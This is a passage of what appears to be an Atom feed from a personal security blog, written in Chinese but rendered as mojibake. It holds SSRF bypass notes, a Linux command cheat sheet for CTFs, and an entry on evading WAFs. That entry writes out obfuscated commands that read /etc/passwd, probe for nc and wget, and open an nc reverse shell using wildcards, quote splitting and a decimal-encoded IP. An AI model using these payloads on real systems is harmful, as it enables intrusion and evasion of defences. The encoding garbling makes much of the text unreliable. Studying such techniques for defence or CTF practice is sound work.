å›¾ç‰‡çš„æ—¶å€™æœ¬åœ°æµè§ˆå™¨ä¸­ä¸åº”è¯¥å­˜åœ¨å›¾ç‰‡çš„è¯·æ±‚ã€‚</a></p><p>åœ¨éªŒè¯å®Œæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ä¹‹åï¼Œæ­¤å¤„å°±æœ‰å¯èƒ½å­˜åœ¨SSRFï¼Œæ¥ä¸‹æ¥éœ€è¦éªŒè¯æ­¤URLæ˜¯å¦å¯ä»¥æ¥è¯·æ±‚å¯¹åº”çš„å†…ç½‘åœ°å€ã€‚é¦–å…ˆæˆ‘ä»¬è¦è·å–å†…ç½‘å­˜åœ¨HTTPæœåŠ¡ä¸”å­˜åœ¨favicon.icoæ–‡ä»¶åœ°å€ï¼Œæ‰èƒ½éªŒè¯æ˜¯å¦æ˜¯SSRFã€‚</p><p>æ­¤å¤„æ‰¾å†…ç½‘åœ°å€å¯ä»¥é€šè¿‡ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„éœ²çš„å†…ç½‘åœ°å€è¿‡æ»¤ç»•è¿‡</p><p>@ï¼š<br><a href="http://www.baidu.com@10.10.10.10ä¸http?/10.10.10.10" target="_blank" rel="noopener">http://www.baidu.com@10.10.10.10ä¸http?/10.10.10.10</a> è¯·æ±‚æ˜¯ç›¸åŒçš„</p><p>è¿‡æ»¤ç»•è¿‡<br>IPåœ°å€è½¬æ¢æˆåè¿›åˆ¶ï¼š<br>127.0.0.1=2130706433</p><h4 id="SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š-1"><a href="#SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š-1" class="headerlink" title="SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š"></a>SSRFæ¼æ´ç»•è¿‡æ–¹æ³•ï¼š</h4><p>ã€€ã€€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.åŸºæœ¬åˆ¤æ–­ï¼ˆæ’é™¤æ³•ï¼‰</span><br><span class="line"></span><br><span class="line">ã€€ã€€å¦‚ï¼šhttp:&#x2F;&#x2F;www.douban.com&#x2F;***&#x2F;service?image&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png</span><br><span class="line"></span><br><span class="line">ã€€ã€€æ’é™¤æ³•ä¸€ï¼šç›´æ¥å³é”®å›¾ç‰‡ï¼Œåœ¨æ–°çª—å£æ‰“å¼€å›¾ç‰‡ï¼Œå¦‚æœæ˜¯æµè§ˆå™¨ä¸ŠURLåœ°å€æ æ˜¯http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.pngï¼Œè¯´æ˜ä¸å­˜åœ¨SSRFæ¼æ´ã€‚</span><br><span class="line"></span><br><span class="line">ã€€ã€€æ’é™¤æ³•äºŒï¼šä½¿ç”¨burpsuiteç­‰æŠ“åŒ…å·¥å…·æ¥åˆ¤æ–­æ˜¯å¦ä¸æ˜¯SSRFï¼Œé¦–å…ˆSSRFæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œå› æ­¤åœ¨åŠ è½½å›¾ç‰‡çš„æ—¶å€™ï¼Œæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥åœ¨æˆ‘ä»¬æœ¬åœ°æµè§ˆå™¨çš„è¯·æ±‚ä¸­å°±ä¸åº”è¯¥å­˜åœ¨å›¾ç‰‡çš„è¯·æ±‚ï¼Œå¦‚æœåˆ·æ–°å½“å‰é¡µé¢ï¼Œæœ‰å¦‚ä¸‹è¯·æ±‚ï¼Œåˆ™å¯åˆ¤æ–­ä¸æ˜¯SSRFã€‚ï¼ˆå‰æè®¾ç½®burpsuiteæˆªæ–­å›¾ç‰‡çš„è¯·æ±‚ï¼Œé»˜è®¤æ˜¯æ”¾è¡Œçš„ï¼‰</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;SSRFæ¼æ´ä»‹ç»ï¼š&quot;&gt;&lt;a href=&quot;#SSRFæ¼æ´ä»‹ç»ï¼š&quot; class=&quot;headerlink&quot; title=&quot;SSRFæ¼æ´ä»‹ç»ï¼š&quot;&gt;&lt;/a&gt;SSRFæ¼æ´ä»‹ç»ï¼š
    
    </summary>
    
    
    
      <category term="ssrf" scheme="http://yoursite.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>é€»è¾‘ç»•è¿‡WAF</title>
    <link href="http://yoursite.com/2020/01/15/%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87WAF/"/>
    <id>http://yoursite.com/2020/01/15/%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87WAF/</id>
    <published>2020-01-15T12:46:57.000Z</published>
    <updated>2020-01-16T08:04:18.502Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01-æŠ€å·§ä¸€-é€šé…ç¬¦"><a href="#0X01-æŠ€å·§ä¸€-é€šé…ç¬¦" class="headerlink" title="0X01 æŠ€å·§ä¸€:é€šé…ç¬¦"></a>0X01 æŠ€å·§ä¸€:é€šé…ç¬¦<a id="more"></a></h4><table><thead><tr><th>*****</th><th><strong>ä»£è¡¨(0ä¸ªåˆ°æ— ç©·å¤šä¸ª)ä»»æ„å­—ç¬¦</strong></th></tr></thead><tbody><tr><td><strong>?</strong></td><td><strong>ä»£è¡¨(ä¸€å®šæœ‰ä¸€ä¸ª)ä»»æ„å­—ç¬¦</strong></td></tr><tr><td><strong>[ ]</strong></td><td><strong>åŒæ ·ä»£è¡¨ï¼ˆä¸€å®šæœ‰ä¸€ä¸ªåœ¨æ‹¬å·å†…ï¼‰çš„å­—ç¬¦ï¼Œä½†æ˜¯éä»»æ„å­—ç¬¦ã€‚</strong></td></tr><tr><td><strong>[ - ]</strong></td><td><strong>ä»£è¡¨åœ¨ç¼–ç é¡ºåºå†…çš„æ‰€æœ‰å­—ç¬¦ï¼Œ[0-9]ä»£è¡¨0åˆ°9ä¹‹é—´æ‰€æœ‰æ•°å­—ï¼Œå› ä¸ºæ•°å­—çš„è¯­ç³»ç¼–ç æ˜¯è¿ç»­çš„</strong></td></tr><tr><td><strong>[^ ]</strong></td><td><strong>è¡¨ç¤ºåå‘é€‰æ‹©ï¼Œ[â€˜^abcâ€™]è¡¨ç¤ºä¸€å®šæœ‰ä¸€ä¸ªå­—ç¬¦ï¼Œåªè¦æ˜¯éaï¼Œbï¼Œcå­—ç¬¦å°±æ¥å—</strong></td></tr></tbody></table><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br><span class="line">ä½¿ç”¨é€šé…ç¬¦</span><br><span class="line">&#x2F;?in&#x2F;?s -l</span><br><span class="line"></span><br><span class="line">è¯»å–&#x2F;etc&#x2F;passwdï¼š</span><br><span class="line">&#x2F;???&#x2F;??t &#x2F;??c&#x2F;p???w?</span><br><span class="line">æœ‰æ—¶å€™WAFä¸å…è®¸ä½¿ç”¨å¤ªå¤šçš„?å·</span><br><span class="line">&#x2F;?in&#x2F;cat &#x2F;?tc&#x2F;p?sswd</span><br><span class="line"></span><br><span class="line">NCåå¼¹shellï¼š</span><br><span class="line">nc -e &#x2F;bin&#x2F;bash 127.0.0.1 3737</span><br><span class="line">ä¸ºäº†é¿å…ç¬¦å·.æˆ‘ä»¬å¯ä»¥å°†IPåœ°å€è½¬æ¢æˆæ•´å‹ã€‚</span><br><span class="line">127.0.0.1 â†’ 2130706433</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨é€šé…ç¬¦</span><br><span class="line"></span><br><span class="line">root@kali:~# &#x2F;??n&#x2F;?c -e &#x2F;??n&#x2F;b??h 2130706433 3737</span><br></pre></td></tr></table></figure><p>0X02 æŠ€å·§äºŒ:è¿æ¥ç¬¦</p><p>ç”¨å¼•å·,åæ–œæ é—­åˆï¼Œå¯ä»¥ç»•è¿‡ä¸€äº›åŒ¹é…å­—ç¬¦ä¸²çš„WAFè§„åˆ™.</p><p>è¯»å–/etc/passwdï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;c&#39;a&#39;t&#39; &#x2F;&#39;e&#39;t&#39;c&#39;&#x2F;&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</span><br></pre></td></tr></table></figure><p>æ£€æµ‹NCï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;c</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰NCçš„æƒ…å†µæ£€æŸ¥wgetï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;w&#39;g&#39;e&#39;t</span><br></pre></td></tr></table></figure><p>å…¶ä»–å­—ç¬¦ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åŒå¼•å·</span><br><span class="line">&#x2F;&quot;b&quot;i&quot;n&quot;&#x2F;&quot;w&quot;h&quot;i&quot;c&quot;h&quot; &quot;n&quot;c</span><br></pre></td></tr></table></figure><p>åæ–œæ† </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;b\i\n&#x2F;w\h\i\c\h n\c</span><br></pre></td></tr></table></figure><h2 id="0Ã—03-æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡"><a href="#0Ã—03-æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡" class="headerlink" title="0Ã—03 æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡"></a>0Ã—03 æŠ€å·§ä¸‰ï¼šæœªåˆå§‹åŒ–çš„bashå˜é‡</h2><p>åœ¨bashç¯å¢ƒä¸­å…è®¸æˆ‘ä»¬ä½¿ç”¨æœªåˆå§‹åŒ–çš„bashå˜é‡ï¼Œå¦‚ä½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a,$b,$c</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬äº‹å…ˆå¹¶æ²¡æœ‰å®šä¹‰å®ƒä»¬ï¼Œè¾“å‡ºçœ‹çœ‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo $a</span><br><span class="line"></span><br><span class="line">root@kali:~# echo $b</span><br><span class="line"></span><br><span class="line">root@kali:~# echo $c</span><br><span class="line"></span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure><p>æœªåˆå§‹åŒ–çš„å˜é‡å€¼éƒ½æ˜¯nullã€‚</p><p>è¯»å–/etc/passwdï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$a &#x2F;etc$a&#x2F;passwd$a</span><br></pre></td></tr></table></figure><h3 id="IFSæ˜¯å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦çš„ç¼©å†™ã€‚å®ƒå†³å®šBashè§£æå­—ç¬¦ä¸²æ—¶å°†æ€æ ·è¯†åˆ«å­—æ®µï¼Œæˆ–å•è¯åˆ†ç•Œçº¿ã€‚é»˜è®¤ä¸ºï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢å·ï¼‰"><a href="#IFSæ˜¯å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦çš„ç¼©å†™ã€‚å®ƒå†³å®šBashè§£æå­—ç¬¦ä¸²æ—¶å°†æ€æ ·è¯†åˆ«å­—æ®µï¼Œæˆ–å•è¯åˆ†ç•Œçº¿ã€‚é»˜è®¤ä¸ºï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢å·ï¼‰" class="headerlink" title="$IFSæ˜¯å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦çš„ç¼©å†™ã€‚å®ƒå†³å®šBashè§£æå­—ç¬¦ä¸²æ—¶å°†æ€æ ·è¯†åˆ«å­—æ®µï¼Œæˆ–å•è¯åˆ†ç•Œçº¿ã€‚é»˜è®¤ä¸ºï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢å·ï¼‰"></a><strong>$IFSæ˜¯å†…éƒ¨å­—æ®µåˆ†éš”ç¬¦çš„ç¼©å†™ã€‚å®ƒå†³å®šBashè§£æå­—ç¬¦ä¸²æ—¶å°†æ€æ ·è¯†åˆ«å­—æ®µï¼Œæˆ–å•è¯åˆ†ç•Œçº¿ã€‚é»˜è®¤ä¸ºï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢å·ï¼‰</strong></h3>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01-æŠ€å·§ä¸€-é€šé…ç¬¦&quot;&gt;&lt;a href=&quot;#0X01-æŠ€å·§ä¸€-é€šé…ç¬¦&quot; class=&quot;headerlink&quot; title=&quot;0X01 æŠ€å·§ä¸€:é€šé…ç¬¦&quot;&gt;&lt;/a&gt;0X01 æŠ€å·§ä¸€:é€šé…ç¬¦
    
    </summary>
    
    
    
      <category term="ç»•è¿‡æŠ€å·§" scheme="http://yoursite.com/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>linuxæŒ‡ä»¤</title>
    <link href="http://yoursite.com/2020/01/15/linux%E6%8C%87%E4%BB%A4/"/>
    <id>http://yoursite.com/2020/01/15/linux%E6%8C%87%E4%BB%A4/</id>
    <published>2020-01-15T10:21:47.000Z</published>
    <updated>2020-05-03T06:02:24.979Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    Kaliå¸¸ç”¨çš„æŒ‡ä»¤åœ¨æ¯”èµ›ä¸­è¿˜æ˜¯ä¼šç»å¸¸ç”¨åˆ°çš„</p><a id="more"></a>ä¸ªäººæ¯”è¾ƒweakï¼Œåšçš„æ•´ç†å°±åªèƒ½å€Ÿé‰´å…¶ä»–åšä¸»çš„ï¼š<h4 id="1-ç›®å½•å’Œæ–‡ä»¶å‘½ä»¤"><a href="#1-ç›®å½•å’Œæ–‡ä»¶å‘½ä»¤" class="headerlink" title="1.ç›®å½•å’Œæ–‡ä»¶å‘½ä»¤"></a>1.ç›®å½•å’Œæ–‡ä»¶å‘½ä»¤</h4><table><thead><tr><th align="center">å‘½ä»¤</th><th align="center">ä½œç”¨</th></tr></thead><tbody><tr><td align="center"><strong>cd/home</strong></td><td align="center"><strong>è¿›å…¥/homeç›®å½•</strong></td></tr><tr><td align="center"><strong>cd ../</strong></td><td align="center"><strong>è¿”å›ä¸Šä¸€çº§ç›®å½•</strong></td></tr><tr><td align="center"><strong>cd ../../</strong></td><td align="center"><strong>è¿”å›ä¸Šä¸¤çº§ç›®å½•</strong></td></tr><tr><td align="center"><strong>cd</strong></td><td align="center"><strong>è¿›å…¥ä¸ªäººä¸»ç›®å½•</strong></td></tr><tr><td align="center"><strong>cd ~user1</strong></td><td align="center"><strong>è¿›å…¥ä¸ªäººçš„ä¸»ç›®å½•</strong></td></tr><tr><td align="center"><strong>cd -</strong></td><td align="center"><strong>è¿”å›ä¸Šæ¬¡æ‰€åœ¨çš„ç›®å½•</strong></td></tr><tr><td align="center"><strong>pwd</strong></td><td align="center"><strong>æ˜¾ç¤ºå·¥ä½œè·¯å¾„</strong></td></tr><tr><td align="center"><strong>ls</strong></td><td align="center"><strong>æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶</strong></td></tr><tr><td align="center"><strong>ls -F</strong></td><td align="center"><strong>æŸ¥çœ‹ç›®å½•ä¸­çš„æ–‡ä»¶</strong></td></tr><tr><td align="center"><strong>ls -l</strong></td><td align="center"><strong>æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„è¯¦ç»†èµ„æ–™</strong></td></tr><tr><td align="center"><strong>ls -a</strong></td><td align="center"><strong>æ˜¾ç¤ºéšè—æ–‡ä»¶</strong></td></tr><tr><td align="center"><strong>ls [0-9]</strong></td><td align="center"><strong>æ˜¾ç¤ºåŒ…å«æ•°å­—çš„æ–‡ä»¶åå’Œç›®å½•å</strong></td></tr><tr><td align="center"><strong>tree</strong></td><td align="center"><strong>æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•ç”±æ ¹ç›®å½•å¼€å§‹çš„æ ‘å½¢ç»“æ„</strong></td></tr><tr><td align="center"><strong>lstree</strong></td><td align="center"><strong>æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•æœ‰æ ¹ç›®å½•å¼€æ•£çš„æ ‘å½¢ç»“æ„</strong></td></tr></tbody></table><h4 id="mkdiråˆ›å»ºç›®å½•"><a href="#mkdiråˆ›å»ºç›®å½•" class="headerlink" title="mkdiråˆ›å»ºç›®å½•"></a>mkdiråˆ›å»ºç›®å½•</h4><table><thead><tr><th><strong>mkdir -p /tmp/dir1/dir2</strong></th><th><strong>åˆ›å»ºä¸€ä¸ªç›®å½•æ ‘</strong></th></tr></thead><tbody><tr><td><strong>rm -f</strong></td><td><strong>åˆ é™¤ä¸€ä¸ªæ–‡ä»¶</strong></td></tr><tr><td><strong>rmdir</strong></td><td><strong>åˆ é™¤ä¸€ä¸ªç›®å½•</strong></td></tr><tr><td><strong>rm -rf</strong></td><td><strong>åˆ é™¤ä¸€ä¸ªç›®å½•å¹¶åŒæ—¶åˆ é™¤å…¶æ–‡ä»¶</strong></td></tr><tr><td><strong>mv</strong></td><td><strong>é‡å‘½åæˆ–è€…ç§»åŠ¨ä¸€ä¸ªç›®å½•</strong></td></tr><tr><td><strong>cp file1 file2</strong></td><td><strong>å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶</strong></td></tr><tr><td><strong>cp dir/*</strong></td><td><strong>å¤åˆ¶ä¸€ä¸ªç›®å½•åˆ°å½“å‰å·¥ä½œç›®å½•</strong></td></tr><tr><td><strong>cp -a/tmp/dir*</strong></td><td><strong>å¤åˆ¶ä¸€ä¸ªç›®å½•åˆ°å½“å‰å·¥ä½œç›®å½•</strong></td></tr><tr><td><strong>cp -a dir1 dir2</strong></td><td><strong>å¤åˆ¶ä¸€ä¸ªç›®å½•</strong></td></tr><tr><td><strong>cp -f</strong></td><td><strong>å¼ºè¡Œå¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•</strong></td></tr></tbody></table><h4 id="touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶"><a href="#touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶" class="headerlink" title="touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶"></a>touchåˆ›å»ºä¸€ä¸ªæ–‡ä»¶</h4><table><thead><tr><th align="center"><strong>-a</strong></th><th align="center"><strong>åªæ›´æ”¹å­˜å‚¨æ—¶é—´</strong></th></tr></thead><tbody><tr><td align="center"><strong>-c</strong></td><td align="center"><strong>ä¸å»ºç«‹ä»»ä½•æ¡£æ¡ˆ</strong></td></tr><tr><td align="center"><strong>-d</strong></td><td align="center"><strong>ä½¿ç”¨åˆ¶å®šçš„æ—¥æœŸï¼Œè€Œéç°åœ¨çš„æ—¶é—´</strong></td></tr><tr><td align="center"><strong>-f</strong></td><td align="center"></td></tr><tr><td align="center"><strong>-m</strong></td><td align="center"><strong>ä¹‹æ›´æ”¹å˜åŠ¨æ—¶é—´</strong></td></tr><tr><td align="center"><strong>-r</strong></td><td align="center"><strong>æŠŠåˆ¶å®šæ–‡æ¡£æˆ–ç›®å½•çš„æ—¥æœŸæ—¶é—´ç»Ÿè®¾æˆå’Œå‚è€ƒæ–‡æ¡£æˆ–ç›®å½•æ—¥æœŸæ—¶é—´ç›¸åŒ</strong></td></tr><tr><td align="center"><strong>-t</strong></td><td align="center"><strong>ä½¿ç”¨æŒ‡å®šæ—¥æœŸæ—¶é—´ï¼Œè€Œéç°åœ¨çš„æ—¶é—´</strong></td></tr></tbody></table><h4 id="catæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹"><a href="#catæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹" class="headerlink" title="catæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹"></a>catæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹</h4><table><thead><tr><th align="center"><strong>-b</strong></th><th align="center"><strong>å¯¹éç©ºè¾“å‡ºçš„æ‰€æœ‰è¡Œç¼–å·</strong></th></tr></thead><tbody><tr><td align="center"><strong>-n</strong></td><td align="center"><strong>å¯¹è¾“å‡ºæ‰€æœ‰è¡Œç¼–å·</strong></td></tr><tr><td align="center"><strong>-s</strong></td><td align="center"><strong>ä¸è¾“å‡ºå¤šè¡Œç©ºè¡Œ</strong></td></tr></tbody></table><h4 id="lessæŸ¥çœ‹æ–‡ä»¶"><a href="#lessæŸ¥çœ‹æ–‡ä»¶" class="headerlink" title="lessæŸ¥çœ‹æ–‡ä»¶"></a>lessæŸ¥çœ‹æ–‡ä»¶</h4><table><thead><tr><th align="center"><strong>N</strong></th><th align="center"><strong>åå‘é‡å¤å‰ä¸€ä¸ªæœç´¢</strong></th></tr></thead><tbody><tr><td align="center"><strong>-i</strong></td><td align="center"><strong>å¿½ç•¥æœç´¢æ—¶çš„å¤§å°å†™</strong></td></tr><tr><td align="center"><strong>-N</strong></td><td align="center"><strong>æ˜¾ç¤ºè¡Œå·</strong></td></tr><tr><td align="center"><strong>/</strong></td><td align="center"><strong>å‘ä¸‹æœç´¢å­—ç¬¦ä¸²</strong></td></tr><tr><td align="center"><strong>ï¼Ÿ</strong></td><td align="center"><strong>å‘ä¸Šæœç´¢å­—ç¬¦ä¸²</strong></td></tr><tr><td align="center"><strong>n</strong></td><td align="center"><strong>é‡å¤å‰ä¸€ä¸ªæœç´ </strong></td></tr></tbody></table><h4 id="åŒ¹é…æŸ¥æ‰¾å‘½ä»¤"><a href="#åŒ¹é…æŸ¥æ‰¾å‘½ä»¤" class="headerlink" title="åŒ¹é…æŸ¥æ‰¾å‘½ä»¤"></a>åŒ¹é…æŸ¥æ‰¾å‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep</span><br><span class="line">grepå‘½ä»¤æ˜¯ä¸€ç§å¼ºå¤§çš„æ–‡æœ¬æœç´¢å·¥å…·ï¼Œä»–èƒ½ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢æ–‡æœ¬ï¼ŒæŠŠåŒ¹é…çš„è¡Œæ‰“å°å‡ºæ¥</span><br></pre></td></tr></table></figure><h4 id="findå‘½ä»¤"><a href="#findå‘½ä»¤" class="headerlink" title="findå‘½ä»¤"></a>findå‘½ä»¤</h4><p>find -name</p><h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h4><table><thead><tr><th align="center"><strong>-c</strong></th><th align="center"><strong>å»ºç«‹ä¸€ä¸ªå‹ç¼©æ–‡ä»¶çš„å‚æ•°æŒ‡ä»¤</strong></th></tr></thead><tbody><tr><td align="center"><strong>-x</strong></td><td align="center"><strong>è§£å¼€ä¸€ä¸ªå‹ç¼©æ–‡ä»¶çš„å‚æ•°æŒ‡ä»¤</strong></td></tr><tr><td align="center"><strong>-t</strong></td><td align="center"><strong>æŸ¥çœ‹tarfileé‡Œé¢çš„æ–‡ä»¶</strong></td></tr><tr><td align="center"><strong>-z</strong></td><td align="center"><strong>æ˜¯å¦åŒæ—¶å…·æœ‰gzipçš„å±æ€§ï¼Œæ˜¯å¦éœ€è¦gzipå‹ç¼©</strong></td></tr><tr><td align="center"><strong>-j</strong></td><td align="center"><strong>æ˜¯å¦åŒæ—¶å…·æœ‰bzip2çš„å±æ€§ï¼Œæ˜¯å¦éœ€è¦bzip2å‹ç¼©</strong></td></tr><tr><td align="center"><strong>-v</strong></td><td align="center"><strong>å‹ç¼©çš„è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ–‡ä»¶</strong></td></tr><tr><td align="center"><strong>-f</strong></td><td align="center"><strong>ä½¿ç”¨æ¡£å</strong></td></tr><tr><td align="center"><strong>-c</strong></td><td align="center"><strong>è§£å‹åˆ°æŒ‡å®šç›®å½•</strong></td></tr></tbody></table><h4 id="æƒé™"><a href="#æƒé™" class="headerlink" title="æƒé™"></a>æƒé™</h4><p>chmod è®¾ç½®æ–‡ä»¶çš„è®¿é—®æƒé™<br>+:å‘æƒé™èŒƒå›´å¢åŠ æƒé™ä»£å·æ‰€è¡¨ç¤ºçš„æƒé™<br>-:å‘æƒé™èŒƒå›´å–æ¶ˆæƒé™ä»£å·æ‰€è¡¨ç¤ºçš„æƒé™<br>=:å‘æƒé™èŒƒå›´èµ‹äºˆæƒé™ä»£å·æ‰€è¡¨ç¤ºçš„æƒé™<br>ç”¨æˆ·ç¬¦å·ï¼š<br>uï¼šæ‹¥æœ‰è€…<br>gï¼šæ‹¥æœ‰è€…åŒç»„ç”¨<br>oï¼šå…¶å®ƒç”¨æˆ·<br>aï¼šæ‰€æœ‰ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¾‹å­</span><br><span class="line">chmod u+w &#x2F;home&#x2F;abc.txt</span><br><span class="line">chmod o-x &#x2F;home&#x2F;abc.txt</span><br></pre></td></tr></table></figure><h4 id="æ¸…å±"><a href="#æ¸…å±" class="headerlink" title="æ¸…å±"></a>æ¸…å±</h4><p>reset</p><h1 id="è¡¥å……-æ–‡æ¡£è¯»å–å†…å®¹"><a href="#è¡¥å……-æ–‡æ¡£è¯»å–å†…å®¹" class="headerlink" title="è¡¥å……:æ–‡æ¡£è¯»å–å†…å®¹"></a>è¡¥å……:æ–‡æ¡£è¯»å–å†…å®¹</h1><p>cat\tac\nl\more\less\head\tail\od\fold\fmt\xxd</p><ul><li>cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹(concatenate)</li><li>tac ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„å€’è‘—å†™ï¼</li><li>nl  æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºé“è¾“å‡ºè¡Œå·ï¼</li><li>more ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</li><li><strong>less</strong> ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥å¾€å‰ç¿»é¡µï¼</li><li>head åªçœ‹å¤´å‡ è¡Œ</li><li><strong>tail</strong> åªçœ‹å°¾å·´å‡ è¡Œ</li><li>od  ä»¥äºŒè¿›ä½çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ï¼</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;â€‹    Kaliå¸¸ç”¨çš„æŒ‡ä»¤åœ¨æ¯”èµ›ä¸­è¿˜æ˜¯ä¼šç»å¸¸ç”¨åˆ°çš„&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="linuxå¸¸ç”¨å‘½ä»¤" scheme="http://yoursite.com/tags/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>é€»è¾‘æ¼æ´</title>
    <link href="http://yoursite.com/2020/01/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/01/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-01-15T08:33:25.000Z</published>
    <updated>2020-01-15T12:45:52.510Z</updated>
    
